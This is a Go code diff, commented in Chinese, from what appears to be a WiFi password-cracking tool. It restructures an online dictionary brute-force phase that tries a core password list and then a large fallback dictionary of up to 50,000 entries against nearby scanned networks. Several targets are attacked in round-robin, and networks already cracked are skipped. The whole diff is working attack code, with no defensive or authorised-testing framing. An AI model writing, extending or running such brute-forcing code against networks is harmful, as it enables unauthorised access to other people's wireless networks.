@@ -743,22 +743,28 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 	// ============================================================
 	if len(phase5Targets) > 0 {
 		fmt.Printf("\n  ╔══════════════════════════════════════════════════════════╗\n")
-		fmt.Printf("  ║  Phase 5: 在线字典爆破（%d个目标，轮询模式）             ║\n", len(phase5Targets))
+		fmt.Printf("  ║  Phase 5: 在线字典爆破（%d个目标）                       ║\n", len(phase5Targets))
 		fmt.Printf("  ╚══════════════════════════════════════════════════════════╝\n")
 
-		// Phase 5a: 核心密码字典（~10万条，不含wifi_dict.txt）
-		// 多目标轮询，delay=0 让CoreWLAN自己控制节奏
 		crackCfg := cracker.CrackConfig{
 			Delay:    0, // CoreWLAN本身每次 ~300ms，无需额外等待
 			Verbose:  verbose,
 			MaxRetry: 1,
 		}
 
-		// 为每个目标生成Phase 5a密码（排除Phase 2已尝试的）
-		var p5aTargets []scanner.WiFiNetwork
-		var p5aPasswords [][]string
+		// 记录Phase 5a成功的SSID集合（Phase 5b跳过这些）
+		p5aSuccessSet := make(map[string]bool)
+
+		// ── Phase 5a: 核心密码字典（不含wifi_dict.txt） ──
+		p5aNets := make([]scanner.WiFiNetwork, 0, len(phase5Targets))
 		for _, pt := range phase5Targets {
-			topSet := make(map[string]bool)
+			p5aNets = append(p5aNets, pt.net)
+		}
+
+		if len(phase5Targets) == 1 {
+			// 单目标：直接爆破
+			pt := phase5Targets[0]
+			topSet := make(map[string]bool, len(pt.topPasswords))
 			for _, p := range pt.topPasswords {
 				topSet[p] = true
 			}
@@ -769,77 +775,96 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 					layer1 = append(layer1, p)
 				}
 			}
-			p5aTargets = append(p5aTargets, pt.net)
-			p5aPasswords = append(p5aPasswords, layer1)
-			fmt.Printf("    %s: %d条核心密码\n", pt.net.SSID, len(layer1))
-		}
-
-		// 多目标轮询爆破 Phase 5a
-		if len(p5aTargets) == 1 {
-			// 单目标直接爆破
 			fmt.Printf("  [Phase 5a] 核心密码字典（%d条，预计%d分钟）...\n",
-				len(p5aPasswords[0]), len(p5aPasswords[0])*300/60000+1)
-			scanner.CacheTarget(p5aTargets[0].SSID)
-			r1 := cracker.CrackOne(p5aTargets[0], p5aPasswords[0], crackCfg)
+				len(layer1), len(layer1)*300/60000+1)
+			scanner.CacheTarget(pt.net.SSID)
+			r1 := cracker.CrackOne(pt.net, layer1, crackCfg)
 			if r1.Success {
 				successCount++
+				p5aSuccessSet[pt.net.SSID] = true
 			}
 		} else {
-			// 多目标：合并为统一密码表 + 轮询
+			// 多目标：用轮询模式，合并密码表
+			var p5aPasswords [][]string
+			for _, pt := range phase5Targets {
+				topSet := make(map[string]bool, len(pt.topPasswords))
+				for _, p := range pt.topPasswords {
+					topSet[p] = true
+				}
+				corePwds := dict.GenerateAllForTarget(pt.net.SSID, pt.net.BSSID)
+				var layer1 []string
+				for _, p := range corePwds {
+					if !topSet[p] {
+						layer1 = append(layer1, p)
+					}
+				}
+				p5aPasswords = append(p5aPasswords, layer1)
+				fmt.Printf("    %s: %d条核心密码\n", pt.net.SSID, len(layer1))
+			}
 			allP5a := dict.MergeAndDedup(p5aPasswords...)
 			fmt.Printf("  [Phase 5a] 轮询模式: %d个目标 × %d条密码（每轮每目标50条）\n",
-				len(p5aTargets), len(allP5a))
-			results := cracker.CrackAllRoundRobin(p5aTargets, allP5a, crackCfg, 50)
+				len(p5aNets), len(allP5a))
+			results := cracker.CrackAllRoundRobin(p5aNets, allP5a, crackCfg, 50)
 			for _, r := range results {
 				if r.Success {
 					successCount++
+					p5aSuccessSet[r.SSID] = true
 				}
 			}
 		}
 
-		// Phase 5b: wifi_dict.txt 大字典兜底
-		// 收集Phase 5a已试过的密码，避免重复
-		triedCore := dict.GenerateCoreChinese()
-		triedSet := make(map[string]bool, len(triedCore))
-		for _, p := range triedCore {
-			triedSet[p] = true
-		}
-		// 构建目标网络列表（用于 allPasswordsForTargets）
-		p5bNets := make([]scanner.WiFiNetwork, 0, len(phase5Targets))
+		// ── Phase 5b: wifi_dict.txt 大字典兜底（跳过已成功的目标） ──
+		var p5bNets []scanner.WiFiNetwork
 		for _, pt := range phase5Targets {
-			p5bNets = append(p5bNets, pt.net)
-			for _, p := range pt.topPasswords {
+			if !p5aSuccessSet[pt.net.SSID] {
+				p5bNets = append(p5bNets, pt.net)
+			}
+		}
+		if len(p5bNets) > 0 {
+			// 收集Phase 5a已试过的密码，避免重复
+			triedCore := dict.GenerateCoreChinese()
+			triedSet := make(map[string]bool, len(triedCore))
+			for _, p := range triedCore {
 				triedSet[p] = true
 			}
-		}
-		allPwds := allPasswordsForTargets(p5bNets, dictFile)
-		var layer2 []string
-		for _, p := range allPwds {
-			if !triedSet[p] {
-				layer2 = append(layer2, p)
-			}
-		}
-		maxLayer2 := 50000
-		if len(layer2) > maxLayer2 {
-			layer2 = layer2[:maxLayer2]
-		}
-		if len(layer2) > 0 {
-			fmt.Printf("  [Phase 5b] 大字典兜底（%d条，预计%d分钟）...\n",
-				len(layer2), len(layer2)*300/60000+1)
-			if len(phase5Targets) == 1 {
-				scanner.CacheTarget(phase5Targets[0].net.SSID)
-				r2 := cracker.CrackOne(phase5Targets[0].net, layer2, crackCfg)
-				if r2.Success {
-					successCount++
+			for _, pt := range phase5Targets {
+				for _, p := range pt.topPasswords {
+					triedSet[p] = true
 				}
-			} else {
-				results := cracker.CrackAllRoundRobin(p5bNets, layer2, crackCfg, 50)
-				for _, r := range results {
-					if r.Success {
+			}
+			allPwds := allPasswordsForTargets(p5bNets, dictFile)
+			var layer2 []string
+			for _, p := range allPwds {
+				if !triedSet[p] {
+					layer2 = append(layer2, p)
+				}
+			}
+			maxLayer2 := 50000
+			if len(layer2) > maxLayer2 {
+				layer2 = layer2[:maxLayer2]
+			}
+			if len(layer2) > 0 {
+				fmt.Printf("  [Phase 5b] 大字典兜底（%d条×%d目标，预计%d分钟）...\n",
+					len(layer2), len(p5bNets), len(layer2)*300/60000+1)
+				if len(p5bNets) == 1 {
+					scanner.CacheTarget(p5bNets[0].SSID)
+					r2 := cracker.CrackOne(p5bNets[0], layer2, crackCfg)
+					if r2.Success {
 						successCount++
 					}
+				} else {
+					results := cracker.CrackAllRoundRobin(p5bNets, layer2, crackCfg, 50)
+					for _, r := range results {
+						if r.Success {
+							successCount++
+						}
+					}
 				}
+			} else {
+				fmt.Println("  [Phase 5b] 跳过（无新增密码）")
 			}
+		} else {
+			fmt.Println("  [Phase 5b] 跳过（所有目标已在Phase 5a命中）")
 		}
 	}
 
